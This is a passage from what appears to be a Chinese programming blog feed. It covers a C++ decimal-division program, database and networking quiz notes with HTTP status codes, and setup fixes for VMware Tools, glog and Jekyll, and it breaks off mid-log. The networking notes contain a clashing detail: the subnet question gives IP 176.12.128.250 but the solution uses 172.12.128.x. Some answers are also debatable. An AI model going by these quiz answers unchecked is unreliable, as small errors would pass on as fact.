      <content type="html"><![CDATA[<p>输入正整数a，b，c，输出a/b的小数形式，精确到小数后c位。(提示：使用循环）</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_LEN 100</span></span><br><span class="line"><span class="type">char</span> ans[MAX_LEN<span class="number">+10</span>];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="built_in">memset</span>(ans,<span class="number">0</span>,<span class="built_in">sizeof</span>(ans));</span><br><span class="line">    <span class="type">int</span> a,b,c;</span><br><span class="line">    <span class="type">int</span> anslen;</span><br><span class="line"></span><br><span class="line">    cin&gt;&gt;a&gt;&gt;b&gt;&gt;c;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(ans,<span class="string">"%d."</span>,a/b);<span class="comment">//打印整数部分及小数点</span></span><br><span class="line">    ans[MAX_LEN<span class="number">+8</span>]=anslen=<span class="built_in">strlen</span>(ans);</span><br><span class="line">    a%=b;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;c; i++)</span><br><span class="line">    {</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="built_in">sprintf</span>(ans+anslen+i,<span class="string">"%d"</span>,a*<span class="number">10</span>/b);</span><br><span class="line">        a=a*<span class="number">10</span>%b;</span><br><span class="line">    }</span><br><span class="line">    ans[MAX_LEN<span class="number">+9</span>]= anslen=<span class="built_in">strlen</span>(ans);</span><br><span class="line">    <span class="type">int</span> flags=<span class="number">0</span>;<span class="comment">//进位标志</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=ans[MAX_LEN<span class="number">+9</span>]<span class="number">-1</span>; i&gt;ans[MAX_LEN<span class="number">+8</span>]<span class="number">-1</span>; i--)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span>(flags)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span>(ans[i]==<span class="string">'9'</span>)</span><br><span class="line">            {</span><br><span class="line">                ans[i]=<span class="string">'0'</span>;</span><br><span class="line">                flags=<span class="number">1</span>;</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span><span class="comment">//停止进位</span></span><br><span class="line">            {</span><br><span class="line">                ans[i]++;</span><br><span class="line">                flags=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span>(ans[i]==<span class="string">'9'</span>)</span><br><span class="line">        {</span><br><span class="line">            ans[i]=<span class="string">'0'</span>;</span><br><span class="line">            flags=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(ans[i]&gt;=<span class="string">'5'</span>)</span><br><span class="line">        {</span><br><span class="line">            ans[i]++;</span><br><span class="line">            flags=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=ans[MAX_LEN<span class="number">+8</span>]<span class="number">-2</span>; i&gt;=<span class="number">0</span>; i--)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span>(flags)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span>(ans[i]==<span class="string">'9'</span>)</span><br><span class="line">            {</span><br><span class="line">                ans[i]=<span class="string">'0'</span>;</span><br><span class="line">                flags=<span class="number">1</span>;</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span><span class="comment">//停止进位</span></span><br><span class="line">            {</span><br><span class="line">                ans[i]++;</span><br><span class="line">                flags=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span>(ans[i]==<span class="string">'9'</span>)</span><br><span class="line">        {</span><br><span class="line">            ans[i]=<span class="string">'0'</span>;</span><br><span class="line">            flags=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(ans[i]&gt;=<span class="string">'5'</span>)</span><br><span class="line">        {</span><br><span class="line">            ans[i]++;</span><br><span class="line">            flags=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>,ans);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> cpp </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>数据库题目集锦</title>
      
      
      <link href="/cn/posts/31998/"/>
      
      
      <url>/cn/posts/31998/</url>
      
      
        
      <content type="html"><![CDATA[<p><strong>在数据库的三级模式结构中，描述数据库中全体数据的全局逻辑结构和特征的是（）</strong><br>答案：.概念模式<br>数据库系统的三级模式结构是指数据库系统是由模式、外模式和内模式三级构成的。 （1）模式 模式也称逻辑模式或概念模式，是数据库中全体数据的逻辑结构和特征的描述，是所有用户的公共数据视图。 模式实际上是数据库数据在逻辑级上的视图。一个数据库只有一个模式。定义模式时不仅要定义数据的逻辑结构，而且要定义数据之间的联系，定义与数据有关的安全性、完整性要求。 （2）外模式 外模式也称用户模式，它是数据库用户能够看见和使用的局部数据的逻辑结构和特征的描述，是数据库用户的数据视图，是与某一应用有关的数据的逻辑表示。 外模式通常是模式的子集。一个数据库可以有多个外模式。应用程序都是和外模式打交道的。外模式是保证数据库安全性的一个有力措施。每个用户只能看见和访问所对应的外模式中的数据，数据库中的其余数据对他们是不可见的。 （3）内模式 内模式也称存储模式，一个数据库只有一个内模式。它是数据物理结构和存储方式的描述，是数据在数据库内部的表示方式。例如，记录的存储方式是顺序结构存储还是B树结构存储；索引按什么方式组织；数据是否压缩，是否加密；数据的存储记录结构有何规定等。</p><p><strong>SQL 语言具有（ ）的功能。</strong><br>答案 ：数据定义、数据操纵、数据控制<br>数据定义：CREATE、DROP、ALTER<br>数据操作：SELECT、DELETE、UPDATE、INSERT<br>数据控制：GRANT、DENY、REVOKE</p><p><strong>在数据库设计中，对数据库存储结构和存取方法的分析在（        ）设计阶段。</strong><br>答案：物理设计<br>需求分析阶段的任务是：对现实世界要处理的对象（组织、部门、企业等）进行详细调查，在了解现行系统的概况，确定新系统功能的过程中，确定系统边界、收集支持系统目标的基础数据及其处理方法。概念设计阶段的任务是：对用户要求描述的现实世界，通过对其进行分类、聚集和概括，建立抽象的概念数据模型，如果是关系数据库，其得到的结果是ER模型。逻辑设计阶段的任务是：将概念数据模型设计成数据库的一种逻辑模式（关系模式），然后对关系模式进一步做规范化处理，从而提高存储效率和处理效率。物理结构设计的任务是：根据特定数据库管理系统所提供的多种存储结构和存取方法，为具体的应用任务选定最合适的物理存储结构、存取方法和存取路径等。这一步设计的结果就是物理数据库</p>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> 数据库 </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>VMware 安装Tools 遇到的问题：VGAuthService 启动失败</title>
      
      
      <link href="/cn/posts/36381/"/>
      
      
      <url>/cn/posts/36381/</url>
      
      
        
      <content type="html"><![CDATA[<blockquote><p>虚拟机里遇到这个问题特此记录一下<br>虚拟机内部环境： Windows 7</p></blockquote><p>问题描述：VGAuthservice 启动失败，请确保您有足够的权限启动系统服务<br>Installing VMware tools fails with error:VGAuthService &amp; Common Agent failed<br>解决方案 ：安装补丁 KB2999226就可以了<br>其他系统建议安装VC运行库看看。</p>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> Linux </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>使用cmake-gui进行转换为Visual Studio  的sln工程文件&amp;&amp;glog在Windows下的使用</title>
      
      
      <link href="/cn/posts/49708/"/>
      
      
      <url>/cn/posts/49708/</url>
      
      
        
      <content type="html"><![CDATA[<p>1.首先将库git到本地<br><a href="https://github.com/google/glog">https://github.com/google/glog</a><br>2.使用cmake-gui进行转换为Visual Studio 的sln工程文件(如下图）<br>（使用我转换好的也可以<a href="https://github.com/czqu/builds/tree/master/glogs">https://github.com/czqu/builds/tree/master/glogs</a></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/49708/20200513181042328.png" alt="在这里插入图片描述"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/49708/20200513181828378.png" alt="在这里插入图片描述"><br><strong>然后选择vs版本和CPU架构</strong>（如果之前编译错了，再进去可能不能进到这个界面，把输出目录删除即可）<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/49708/20200513181222563.png" alt="在这里插入图片描述"><br>3.点击generate，即可完成。</p><p>4.如果出现如下错误，说明你缺少gflags库，编译方法和上面一样不再赘述<br><a href="https://github.com/gflags/gflags">https://github.com/gflags/gflags</a></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Could not find a package configuration file provided by <span class="string">"gflags"</span> (requested</span><br><span class="line">  version 2.2.0) with any of the following names:</span><br><span class="line"></span><br><span class="line">    gflagsConfig.cmake</span><br><span class="line">    gflags-config.cmake</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/49708/20200513181714187.png" alt="在这里插入图片描述"><br>5.然后新建一个测试工程（debug库和release库不能混用，不同架构也不能），添加头文件和库目录，记得需要在开头加上 GLOG_NO_ABBREVIATED_SEVERITIES和GOOGLE_GLOG_DLL_DECL，不然会报错</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GLOG_NO_ABBREVIATED_SEVERITIES</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GOOGLE_GLOG_DLL_DECL</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;logging.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> google;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _DEBUG</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">"glogd.lib"</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">"glog.lib"</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// DEBUG</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">testGlog2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="type">char</span> str[<span class="number">20</span>] = <span class="string">"hello log!"</span>;</span><br><span class="line"><span class="type">int</span> i = <span class="number">100000</span>;</span><br><span class="line"><span class="keyword">while</span> (i &gt; <span class="number">0</span>) {</span><br><span class="line">    <span class="comment">//  LOG(INFO) &lt;&lt; str;</span></span><br><span class="line">    <span class="built_in">LOG</span>(INFO) &lt;&lt; <span class="string">"2info 2test"</span> &lt;&lt; <span class="string">"2hello 2log!"</span>;  <span class="comment">//输出一个Info日志</span></span><br><span class="line">    <span class="comment">//  LOG(WARNING) &lt;&lt; "warning test";  //输出一个Warning日志</span></span><br><span class="line">  <span class="comment">//    LOG(ERROR) &lt;&lt; "error test";  //输出一个Error日志</span></span><br><span class="line">    i--;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">testGlog</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="comment">// Start google log system:</span></span><br><span class="line">FLAGS_log_dir = <span class="string">"E:\\logs"</span>;</span><br><span class="line">google::<span class="built_in">InitGoogleLogging</span>(<span class="string">"loglog"</span>);</span><br><span class="line">google::<span class="built_in">SetLogDestination</span>(google::GLOG_INFO, <span class="string">"E:\\logs\\INFO_"</span>);</span><br><span class="line">google::<span class="built_in">SetStderrLogging</span>(google::GLOG_FATAL);</span><br><span class="line">google::<span class="built_in">SetLogFilenameExtension</span>(<span class="string">"log_"</span>);</span><br><span class="line">FLAGS_colorlogtostderr = <span class="literal">true</span>;  <span class="comment">// Set log color</span></span><br><span class="line">FLAGS_logbufsecs = <span class="number">0</span>;  <span class="comment">// Set log output speed(s)</span></span><br><span class="line">FLAGS_max_log_size = <span class="number">1024</span>;  <span class="comment">// Set max log file size</span></span><br><span class="line">FLAGS_stop_logging_if_full_disk = <span class="literal">true</span>;  <span class="comment">// If disk is full</span></span><br><span class="line">thread *t = <span class="keyword">new</span> <span class="built_in">thread</span>(testGlog2);</span><br><span class="line"><span class="type">char</span> str[<span class="number">20</span>] = <span class="string">"hello log!"</span>;</span><br><span class="line"><span class="type">int</span> i = <span class="number">100000</span>;</span><br><span class="line"><span class="keyword">while</span> (i &gt; <span class="number">0</span>) {</span><br><span class="line"><span class="comment">//  LOG(INFO) &lt;&lt; str;</span></span><br><span class="line">    <span class="built_in">LOG</span>(INFO) &lt;&lt; <span class="string">"info test"</span> &lt;&lt; <span class="string">"hello log!"</span>;  <span class="comment">//输出一个Info日志</span></span><br><span class="line"><span class="comment">//  LOG(WARNING) &lt;&lt; "warning test";  //输出一个Warning日志</span></span><br><span class="line"><span class="comment">//  LOG(ERROR) &lt;&lt; "error test";  //输出一个Error日志</span></span><br><span class="line">    i--;</span><br><span class="line">}</span><br><span class="line">t-&gt;<span class="built_in">join</span>();</span><br><span class="line">google::<span class="built_in">ShutdownGoogleLogging</span>();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> Windows </tag>
        
            
            
        <tag> cpp </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>计算机网络题目集锦</title>
      
      
      <link href="/cn/posts/1279/"/>
      
      
      <url>/cn/posts/1279/</url>
      
      
        
      <content type="html"><![CDATA[<p><strong>音频的时延抖动可通过在发送方为每个块规定一个序号或时间戳，在接收方延迟播放音频块来消除。</strong><br>答案：正确</p><p>什么是抖动？</p><p>在网络上连续传输的数据包即便使用相同的路径，也会有不同的延时。这是由于分组交换网络固有的两个关键原因造成的。第一，数据包被单独路由。第二，网络设备接收队列中的数据包，因此无法保证延时调度不变。</p><p>每个数据包之间的这种延时不一致称为抖动。</p><p>为了弥补抖动，在连接的接收端使用抖动缓冲区。抖动缓冲区收集并存储传入数据包，以便它可以确定如何以一致的间隔发送它们。</p><ol><li><p>静态抖动缓冲—其在系统的硬件中实现，并且通常由制造商配置。</p></li><li><p>动态抖动缓冲—其在系统软件中实现，并由管理员进行配置。他们可对缓冲进行调整以适应网络变化。</p></li></ol><p>播放延时</p><p>播放延时是数据包到达时和播放时间之间的延时。当抖动缓冲区存储传入数据包并等待以均匀间隔分配它们时，这会增加数据包到达时间与播放时间之间的时间，也被称为播放延时。这个延时是由抖动缓冲区引入的，因为它负责规定传入数据包何时分发。</p><p><strong>目前,最流行的以太网组网的拓扑结构是 （星型结构 ）。</strong></p><p><strong>HDLC中，数据比特串0111101111110装帧发送出去的串为（01111011111010 ）。</strong><br>HDLC协议每次发送方要发送的信息中含有5个以上连续的1时，它总要在第五个1后面插入一个冗余的0，不管第6个位是0还是1，这个额外的0都要插入。</p><p><strong>能提供E1接口的路由器是CISCO 4500</strong></p><p><strong>Linux中，一个端口能够接受tcp链接数量的理论上限是？</strong><br>答案：无上限</p><p><strong>采用FDM技术进行多路复用时，复用后的信号的带宽通常( 大于复用前所有信号的带宽之和   )。</strong></p><p>对于频分复用技术而言，信号一般得调制为模拟信号，因为只有模拟才有频率可言。。<br>信号的频率是有范围的，频分多路复用是将多路基带信号调制到不同频率载波上再进行叠加形成一个复合信号。在物理信道的可用带宽超过单个原始信号所需带宽的情况下，可将该物理信道的总带宽分割成若干个与传输单个信号带宽相同（或略宽）的子信道，每个子信道传输一种信号。<br>每个子信道分配的带宽总和  必须不超过  信道的总带宽，所以  复用后的信号的带宽 ≤ 信道总带宽。（本来就这么宽，多路复用也不能把物理带宽给撑大了，hhh）<br>但是题目说的是  复用前所有信号的带宽之和，因为分割的子信道一般略大于传输单个信号带宽，所以，选择大于。</p><p><strong>一主机的IP地址配置为176.12.128.250，子网掩码配置为255.255.255.248，则其默认网关可配置为 D_ 。</strong></p><p>A 176.12.128.1<br>B 176.12.128.248<br>C 192.168.1.1<br>D 176.12.128.254</p><p>根据主机ip：       172  .  12  .  128  . 1111 1010<br> 子网掩码：      255  . 255  .  255  . 1111 1000<br>求得子网号为：   172  .  12  .  128  . 1111 1000   (即172.12.128.248)<br>对于A，172.12.128.0000 0001不在同一个网段<br>对于B，网络中全0和全1留作他用<br>对于C，不在同一个网段<br>D选项 172.12.128.1111 1110 在同一个网段，答案选D</p><p><strong>下列选项中，对正确接收到的数据帧进行确认的MAC协议是（CSMA/CA）。</strong></p><p>CSMA/CA①用于无线网②ack重传确认③RTS， CTS隐蔽站④不需要发送检测冲突</p><p><strong>在掩码为 255.255.224.0 条件下，下面哪些 ip 地址属于同一网段（AC）</strong><br>A 192.168.235.25<br>B 192.168.188.99<br>C 192.168.246.187<br>D 192.168.67.28</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/1279/20200328213407978.png" alt="在这里插入图片描述"></p><p><strong>以下有关Http协议的描述中，正确的有？</strong></p><p>A post请求一般用于修改服务器上的资源，对发送的消息数据量没有限制，通过表单方式提交<br>B HTTP返回码302表示永久重定向，需要重新URI<br>C 可以通过206返回码实现断点续传<br>D HTTP1.1实现了持久连接和管线化操作以及主动通知功能，相比http1.0有大福性能提升</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/1279/20200328213736357.png" alt="在这里插入图片描述"></p><p>错误代码(也称作状态代码)，指为服务器所接收每个请求(网页点击)分配的 3 位数代码。多数有效网页点击都有状态代码 200(“正常”)。”网页未找到”错误会生产 404 错误。</p><p>1xx(临时响应)<br>用于表示临时响应并需要请求者执行操作才能继续的状态代码。<br>100(继续) 请求者应当继续提出请求。服务器返回此代码则意味着，服务器已收到了请求的第一部分，现正在等待接收其余部分。<br>101(切换协议) 请求者已要求服务器切换协议，服务器已确认并准备进行切换。</p><p>2xx(成功)<br>用于表示服务器已成功处理了请求的状态代码。<br>代码 说明<br>200(成功) 服务器已成功处理了请求。通常，这表示服务器提供了请求的网页。如果您的 robots.txt文件显示为此状态，那么，这表示 Googlebot 已成功检索到该文件。<br>201(已创建) 请求成功且服务器已创建了新的资源。<br>202(已接受) 服务器已接受了请求，但尚未对其进行处理。<br>203(非授权信息) 服务器已成功处理了请求，但返回了可能来自另一来源的信息。<br>204(无内容) 服务器成功处理了请求，但未返回任何内容。<br>205(重置内容) 服务器成功处理了请求，但未返回任何内容。与 204 响应不同，此响应要求请求者重置文档视图(例如清除表单内容以输入新内容)。<br>206(部分内容) 服务器成功处理了部分 GET 请求。</p><p>3xx(已重定向)<br>要完成请求，您需要进一步进行操作。通常，这些状态代码是永远重定向的。Google 建议您在每次请求时使用的重定向要少于 5 个。您可以使用网站管理员工具来查看 Googlebot 在抓取您已重定向的网页时是否会遇到问题。诊断下的抓取错误页中列出了 Googlebot 由于重定向错误而无法抓取的网址。<br>300(多种选择) 服务器根据请求可执行多种操作。服务器可根据请求者 (User agent) 来选择一项操作，或提供操作列表供请求者选择。<br>301(永久移动) 请求的网页已被永久移动到新位置。服务器返回此响应(作为对 GET 或 HEAD 请求的响应)时，会自动将请求者转到新位置。您应使用此代码通知 Googlebot 某个网页或网站已被永久移动到新位置。<br>302(临时移动) 服务器目前正从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。此代码与响应 GET 和 HEAD 请求的 301 代码类似，会自动将请求者转到不同的位置。但由于 Googlebot 会继续抓取原有位置并将其编入索引，因此您不应使用此代码来通知 Googlebot 某个页面或网站已被移动。<br>303(查看其他位置) 当请求者应对不同的位置进行单独的 GET 请求以检索响应时，服务器会返回此代码。对于除 HEAD 请求之外的所有请求，服务器会自动转到其他位置。<br>304(未修改) 自从上次请求后，请求的网页未被修改过。服务器返回此响应时，不会返回网页内容。<br>如果网页自请求者上次请求后再也没有更改过，您应当将服务器配置为返回此响应(称为 If-Modified-Since HTTP 标头)。由于服务器可以告诉 Googlebot 自从上次抓取后网页没有更改过，因此可节省带宽和开销。<br>305(使用***) 请求者只能使用<em><strong>访问请求的网页。如果服务器返回此响应，那么，服务器还会指明请求者应当使用的</strong></em>。<br>307(临时重定向) 服务器目前正从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。此代码与响应 GET 和 HEAD 请求的 301 代码类似，会自动将请求者转到不同的位置。但由于 Googlebot 会继续抓取原有位置并将其编入索引，因此您不应使用此代码来通知 Googlebot 某个页面或网站已被移动。</p><p>4xx(请求错误)<br>这些状态代码表示，请求可能出错，已妨碍了服务器对请求的处理。<br>400(错误请求) 服务器不理解请求的语法。<br>401(未授权) 请求要求进行身份验证。登录后，服务器可能会返回对页面的此响应。<br>403(已禁止) 服务器拒绝请求。如果在 Googlebot 尝试抓取您网站上的有效网页时显示此状态代码(您可在 Google 网站管理员工具中诊断下的网络抓取页面上看到此状态代码)，那么，这可能是您的服务器或主机拒绝 Googlebot 对其进行访问。<br>404(未找到) 服务器找不到请求的网页。例如，如果请求是针对服务器上不存在的网页进行的，那么，服务器通常会返回此代码。<br>如果您的网站上没有 robots.txt 文件，而您在 Google 网站管理员工具”诊断”标签的 robots.txt 页上发现此状态，那么，这是正确的状态。然而，如果您有 robots.txt 文件而又发现了此状态，那么，这说明您的 robots.txt 文件可能是命名错误或位于错误的位置。(该文件应当位于顶级域名上，且应当名为 robots.txt)。<br>如果您在 Googlebot 尝试抓取的网址上发现此状态(位于”诊断”标签的 HTTP 错误页上)，那么，这表示 Googlebot 所追踪的可能是另一网页中的无效链接(旧链接或输入有误的链接)。<br>405(方法禁用) 禁用请求中所指定的方法。<br>406(不接受) 无法使用请求的内容特性来响应请求的网页。<br>407(需要<em><strong>授权) 此状态代码与 401(未授权)类似，但却指定了请求者应当使用</strong></em>进行授权。如果服务器返回此响应，那么，服务器还会指明请求者应当使用的***。<br>408(请求超时) 服务器等候请求时超时。<br>409(冲突) 服务器在完成请求时发生冲突。服务器必须包含有关响应中所发生的冲突的信息。服务器在响应与前一个请求相冲突的 PUT 请求时可能会返回此代码，同时会提供两个请求的差异列表。<br>410(已删除) 如果请求的资源已被永久删除，那么，服务器会返回此响应。该代码与 404(未找到)代码类似，但在资源以前有但现在已经不复存在的情况下，有时会替代 404 代码出现。如果资源已被永久删除，那么，您应当使用 301 代码指定该资源的新位置。<br>411(需要有效长度) 服务器不会接受包含无效内容长度标头字段的请求。<br>412(未满足前提条件) 服务器未满足请求者在请求中设置的其中一个前提条件。<br>413(请求实体过大) 服务器无法处理请求，因为请求实体过大，已超出服务器的处理能力。<br>414(请求的 URI 过长) 请求的 URI(通常为网址)过长，服务器无法进行处理。<br>415(不支持的媒体类型) 请求的格式不受请求页面的支持。<br>416(请求范围不符合要求) 如果请求是针对网页的无效范围进行的，那么，服务器会返回此状态代码。<br>417(未满足期望值) 服务器未满足”期望”请求标头字段的要求。</p><p>5xx(服务器错误)<br>这些状态代码表示，服务器在尝试处理请求时发生内部错误。这些错误可能是服务器本身的错误，而不是请求出错。</p><p>500(服务器内部错误) 服务器遇到错误，无法完成请求。<br>501(尚未实施) 服务器不具备完成请求的功能。例如，当服务器无法识别请求方法时，服务器可能会返回此代码。<br>502(错误网关) 服务器作为网关或***，从上游服务器收到了无效的响应。<br>503(服务不可用) 目前无法使用服务器(由于超载或进行停机维护)。通常，这只是一种暂时的状态。<br>504(网关超时) 服务器作为网关或代理，未及时从上游服务器接收请求。<br>505(HTTP 版本不受支持) 服务器不支持请求中所使用的 HTTP 协议版本。</p>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> 计算机网络 </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>Windows下用gem install jekyll命令安装jekyll错误</title>
      
      
      <link href="/cn/posts/1223/"/>
      
      
      <url>/cn/posts/1223/</url>
      
      
        
      <content type="html"><![CDATA[<p>Windows下用gem install jekyll命令安装jekyll错误的解决方案</p><p>ERROR: Failed to build gem native extension</p><h2 id="错误如下："><a href="#错误如下：" class="headerlink" title="错误如下："></a>错误如下：</h2><p>ruby版本也正常，安装的也是with devkit的版本</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Temporarily enhancing PATH <span class="keyword">for</span> MSYS/MINGW... </span><br><span class="line">Building native extensions. This could take a <span class="keyword">while</span>...    </span><br><span class="line">ERROR:  Error installing jekyll:                    </span><br><span class="line">ERROR: Failed to build gem native extension.                                           </span><br><span class="line">current directory: 